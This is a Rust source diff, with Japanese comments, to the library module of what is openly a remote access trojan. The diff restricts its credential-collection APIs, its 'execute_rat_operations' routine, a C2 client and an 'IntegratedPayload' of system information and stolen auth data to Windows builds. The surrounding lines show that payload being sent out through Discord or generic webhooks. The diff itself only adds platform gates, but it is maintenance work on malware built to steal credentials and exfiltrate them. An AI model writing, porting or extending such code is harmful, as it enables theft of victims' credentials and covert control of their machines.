@@ -50,6 +50,8 @@ pub mod services;    // バックグラウンドサービス機能
 
 // 公開API（新しいモジュール構造に対応）
 pub use core::{Config, load_config_or_default};
+// Windows専用の収集系APIはWindowsのみ公開
+#[cfg(windows)]
 pub use collectors::{
     SystemInfo, get_system_info, get_system_info_async, DiskInfo, NetworkInterface,
     AuthData, collect_auth_data_with_config,
@@ -62,6 +64,7 @@ pub use network::{UploadResult, UploadError, Uploader, upload_data_file, upload_
 pub use services::{C2Client};
 
 // メイン実行機能
+#[cfg(windows)]
 pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
     let mut results = Vec::new();
     
@@ -89,6 +92,7 @@ pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
 }
 
 // 統合データペイロード作成
+#[cfg(windows)]
 #[derive(Serialize, Deserialize, Debug)]
 pub struct IntegratedPayload {
     pub system_info: SystemInfo,
@@ -101,6 +105,7 @@ pub struct IntegratedPayload {
     pub encryption_nonce: Option<String>, // Base64エンコードされたノンス
 }
 
+#[cfg(windows)]
 impl IntegratedPayload {
     pub async fn create_with_config(config: &Config) -> RatResult<Self> {
         let system_info = get_system_info_async().await?;
@@ -140,6 +145,7 @@ impl IntegratedPayload {
 
 
 // Webhook送信（統合版）
+#[cfg(windows)]
 pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
     if !config.webhook_enabled {
         return Ok(());
@@ -154,6 +160,7 @@ pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) 
     }
 }
 
+#[cfg(windows)]
 async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
     use serde_json::json;
 
@@ -230,6 +237,7 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
     send_json_webhook(&config.webhook_url, body, "Discord Webhook", config.timeout_seconds).await
 }
 
+#[cfg(windows)]
 async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
     let body = serde_json::to_string(payload)?;
     send_json_webhook(&config.webhook_url, body, "Generic Webhook", config.timeout_seconds).await
@@ -264,6 +272,9 @@ async fn send_json_webhook(url: &str, body: String, context: &str, timeout_secon
 }
 
 // ユーティリティ関数
+#[cfg(windows)]
 pub fn get_local_ip() -> Option<String> {
     crate::collectors::system_info::get_primary_local_ip()
 }
+#[cfg(not(windows))]
+pub fn get_local_ip() -> Option<String> { None }
